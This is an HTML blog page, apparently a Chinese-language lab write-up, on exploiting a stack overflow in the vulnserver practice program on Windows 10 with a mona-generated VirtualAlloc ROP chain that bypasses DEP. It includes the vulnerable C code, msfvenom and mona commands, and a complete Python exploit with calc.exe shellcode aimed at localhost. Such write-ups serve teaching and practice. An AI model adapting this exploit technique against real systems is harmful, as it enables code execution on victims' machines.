@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Windows 10 Bypass DEP"/>
+
+
+
+
+
+
+
+
+    <link rel="alternate" href="/default" title="Boxer">
+
+
+
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1"/>
+
+
+
+<link rel="canonical" href="http://yoursite.com/2020/05/10/windows10-bypass-dep/"/>
+
+
+<meta name="description" content="环境操作系统：Windows 10 x64 (运行的是32位的程序)漏洞程序：vulnserver (国外研究员开发用来练习漏洞利用的程序) 开启DEP选择为所有程序和服务开启DEP。 漏洞分析vulnserver 里面作者设计了各种漏洞，我们这里只需要找一个栈溢出即可。 直接查看源码或者IDA反编译都可以，这里直接贴出栈溢出的代码： 1234567891011121314151617181920">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 10 Bypass DEP">
+<meta property="og:url" content="http://yoursite.com/2020/05/10/windows10-bypass-dep/index.html">
+<meta property="og:site_name" content="Boxer">
+<meta property="og:description" content="环境操作系统：Windows 10 x64 (运行的是32位的程序)漏洞程序：vulnserver (国外研究员开发用来练习漏洞利用的程序) 开启DEP选择为所有程序和服务开启DEP。 漏洞分析vulnserver 里面作者设计了各种漏洞，我们这里只需要找一个栈溢出即可。 直接查看源码或者IDA反编译都可以，这里直接贴出栈溢出的代码： 1234567891011121314151617181920">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/image/15891068174082.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15891080829182.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15891083745190.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15891091159702.jpg">
+<meta property="article:published_time" content="2020-05-10T07:11:07.566Z">
+<meta property="article:modified_time" content="2020-05-10T11:11:56.485Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/image/15891068174082.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1"/>
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+    
+
+
+
+
+
+    
+
+
+
+
+
+    <title> Windows 10 Bypass DEP - Boxer </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Boxer</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="https://github.com/songjianyang" target="_blank" rel="noopener">
+                            
+                            
+                                Github
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/Links">
+                            
+                            
+                                Links
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                
+            </ul>
+        
+    </nav>
+
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Windows 10 Bypass DEP
+        
+      </h1>
+
+      <time class="post-time">
+          2020-05-10
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>操作系统：Windows 10 x64 (运行的是32位的程序)<br>漏洞程序：<a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html" target="_blank" rel="noopener">vulnserver</a> (国外研究员开发用来练习漏洞利用的程序)</p>
+<h3 id="开启DEP"><a href="#开启DEP" class="headerlink" title="开启DEP"></a>开启DEP</h3><p>选择为所有程序和服务开启DEP。<br><img src="/image/15891068174082.jpg" alt=""></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>vulnserver 里面作者设计了各种漏洞，我们这里只需要找一个栈溢出即可。</p>
+<p>直接查看源码或者IDA反编译都可以，这里直接贴出栈溢出的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Function3</span><span class="params">(<span class="keyword">char</span> *Input)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> Buffer2S[<span class="number">2000</span>];	</span><br><span class="line">	<span class="built_in">strcpy</span>(Buffer2S, Input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......省略</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (CSocket) &#123;</span><br><span class="line">		Result = recv(<span class="built_in">Client</span>, RecvBuf, RecvBufLen, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (Result &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		  </span><br><span class="line">		  ......省略</span><br><span class="line">		  </span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strncmp</span>(RecvBuf, <span class="string">"TRUN "</span>, <span class="number">5</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">char</span> *TrunBuf = <span class="built_in">malloc</span>(<span class="number">3000</span>);</span><br><span class="line">				<span class="built_in">memset</span>(TrunBuf, <span class="number">0</span>, <span class="number">3000</span>);</span><br><span class="line">				<span class="keyword">for</span> (i = <span class="number">5</span>; i &lt; RecvBufLen; i++) &#123;</span><br><span class="line">					<span class="keyword">if</span> ((<span class="keyword">char</span>)RecvBuf[i] == <span class="string">'.'</span>) &#123;</span><br><span class="line">						<span class="built_in">strncpy</span>(TrunBuf, RecvBuf, <span class="number">3000</span>);				</span><br><span class="line">						Function3(TrunBuf);</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">memset</span>(TrunBuf, <span class="number">0</span>, <span class="number">3000</span>);				</span><br><span class="line">				SendResult = send( <span class="built_in">Client</span>, <span class="string">"TRUN COMPLETE\n"</span>, <span class="number">14</span>, <span class="number">0</span> );</span><br></pre></td></tr></table></figure>
+
+<p>意思是要求前5个字符是 <code>TRUN</code>，然后第6个字符是<code>.</code>,这样它就会调用Function3，将我们send过去的数据复制到缓冲区Buffer2S中，其大小是2000，所以我们填充2000+个字符就能覆盖到返回地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =  'TRUN .'</span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">2006</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="构造ROP"><a href="#构造ROP" class="headerlink" title="构造ROP"></a>构造ROP</h3><p>因为我们开启了DEP，所以需要找一系列的ROP指令来绕过它。这里可以利用 Immunity Debugger 中的 mona.py 插件来自动化生成ROP指令。</p>
+<p>但是这里有一个小坑，我测试时发现它会生成像 <code>LEA EBX,EAX</code> 这种错误指令，所以我把它的代码改了一下。</p>
+<p>修改后的代码： <a href="/image/mona.py">mona.py</a>。 安装方法：将 mona.py 放到 Immunity Debugger 的 PyCommands 目录。</p>
+<p>命令：<code>!mona rop -cp nonull  -m *.dll</code></p>
+<p><img src="/image/15891080829182.jpg" alt=""></p>
+<p>然后用 msfvenom 生成 shellcode:<br><code>./msfvenom -p windows/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f python -a x86</code></p>
+<p><img src="/image/15891083745190.jpg" alt=""></p>
+<h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><p>这里最终的利用代码，布局如下：<br><code>padding -&gt; rop chain（返回地址）-&gt; padding -&gt; shellcode -&gt; padding</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_rop_chain</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">     <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">     <span class="number">0x76f2eca8</span>,  <span class="comment"># POP ECX # RETN [ucrtbase.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x7e14e2ac</span>,  <span class="comment"># ptr to &amp;VirtualAlloc() [IAT ConEmuHk.dll]</span></span><br><span class="line">     <span class="number">0x76d2fde1</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x76876802</span>,  <span class="comment"># XCHG EAX,ESI # RETN [KERNELBASE.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">     <span class="number">0x76f5d2bf</span>,  <span class="comment"># POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x76ee9944</span>,  <span class="comment"># &amp; jmp esp [ucrtbase.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">     <span class="number">0x76cf1998</span>,  <span class="comment"># POP EAX # RETN [USER32.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0xffffffff</span>,  <span class="comment"># Value to negate, will become 0x00000001</span></span><br><span class="line">     <span class="number">0x74e06bdd</span>,  <span class="comment"># NEG EAX # RETN [gdi32full.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x76cebb14</span>,  <span class="comment"># XCHG EAX,EBX # RETN [USER32.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">     <span class="number">0x768af47a</span>,  <span class="comment"># POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0xa2bf4fcd</span>,  <span class="comment"># put delta into eax (-&gt; put 0x00001000 into edx)</span></span><br><span class="line">     <span class="number">0x769a6010</span>,  <span class="comment"># ADD EAX,5D40C033 # RETN [msvcrt.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x7626ada7</span>,  <span class="comment"># XCHG EAX,EDX # RETN [KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">     <span class="number">0x76d5ffc9</span>,  <span class="comment"># POP EAX # RETN [USER32.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">     <span class="number">0x76d1bfe3</span>,  <span class="comment"># NEG EAX # RETN [USER32.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x77211f4d</span>,  <span class="comment"># XCHG EAX,ECX # RETN [ntdll.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">     <span class="number">0x76edd23b</span>,  <span class="comment"># POP EDI # RETN [ucrtbase.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x74e4d085</span>,  <span class="comment"># RETN (ROP NOP) [gdi32full.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">     <span class="number">0x770d317c</span>,  <span class="comment"># POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR</span></span><br><span class="line">     <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">     <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">     <span class="number">0x7714c5ee</span>,  <span class="comment"># PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR</span></span><br><span class="line">   ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b"\xda\xdb\xbe\x7a\x98\xa7\x3b\xd9\x74\x24\xf4\x5f\x29"</span></span><br><span class="line">shellcode += <span class="string">b"\xc9\xb1\x31\x31\x77\x18\x83\xef\xfc\x03\x77\x6e\x7a"</span></span><br><span class="line">shellcode += <span class="string">b"\x52\xc7\x66\xf8\x9d\x38\x76\x9d\x14\xdd\x47\x9d\x43"</span></span><br><span class="line">shellcode += <span class="string">b"\x95\xf7\x2d\x07\xfb\xfb\xc6\x45\xe8\x88\xab\x41\x1f"</span></span><br><span class="line">shellcode += <span class="string">b"\x39\x01\xb4\x2e\xba\x3a\x84\x31\x38\x41\xd9\x91\x01"</span></span><br><span class="line">shellcode += <span class="string">b"\x8a\x2c\xd3\x46\xf7\xdd\x81\x1f\x73\x73\x36\x14\xc9"</span></span><br><span class="line">shellcode += <span class="string">b"\x48\xbd\x66\xdf\xc8\x22\x3e\xde\xf9\xf4\x35\xb9\xd9"</span></span><br><span class="line">shellcode += <span class="string">b"\xf7\x9a\xb1\x53\xe0\xff\xfc\x2a\x9b\xcb\x8b\xac\x4d"</span></span><br><span class="line">shellcode += <span class="string">b"\x02\x73\x02\xb0\xab\x86\x5a\xf4\x0b\x79\x29\x0c\x68"</span></span><br><span class="line">shellcode += <span class="string">b"\x04\x2a\xcb\x13\xd2\xbf\xc8\xb3\x91\x18\x35\x42\x75"</span></span><br><span class="line">shellcode += <span class="string">b"\xfe\xbe\x48\x32\x74\x98\x4c\xc5\x59\x92\x68\x4e\x5c"</span></span><br><span class="line">shellcode += <span class="string">b"\x75\xf9\x14\x7b\x51\xa2\xcf\xe2\xc0\x0e\xa1\x1b\x12"</span></span><br><span class="line">shellcode += <span class="string">b"\xf1\x1e\xbe\x58\x1f\x4a\xb3\x02\x75\x8d\x41\x39\x3b"</span></span><br><span class="line">shellcode += <span class="string">b"\x8d\x59\x42\x6b\xe6\x68\xc9\xe4\x71\x75\x18\x41\x8d"</span></span><br><span class="line">shellcode += <span class="string">b"\x3f\x01\xe3\x06\xe6\xd3\xb6\x4a\x19\x0e\xf4\x72\x9a"</span></span><br><span class="line">shellcode += <span class="string">b"\xbb\x84\x80\x82\xc9\x81\xcd\x04\x21\xfb\x5e\xe1\x45"</span></span><br><span class="line">shellcode += <span class="string">b"\xa8\x5f\x20\x26\x2f\xcc\xa8\x87\xca\x74\x4a\xd8"</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">'TRUN .'</span></span><br><span class="line">payload += <span class="string">'A'</span> * <span class="number">2006</span></span><br><span class="line">payload += rop_chain</span><br><span class="line">payload += <span class="string">"\x90"</span> * <span class="number">6</span></span><br><span class="line">payload += shellcode</span><br><span class="line">payload += <span class="string">'C'</span>* len(payload)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="keyword">print</span> e</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/15891091159702.jpg" alt=""></p>
+
+            </div>
+          
+
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2012 -
+    
+    2020
+    <span class="footer-author">.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/henryhuang/hexo-theme-polarbearsimple" target="_blank" rel="noopener">Polar Bear Simple</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    
+
+  
+ 
+  </script>
+  </body>
+</html>
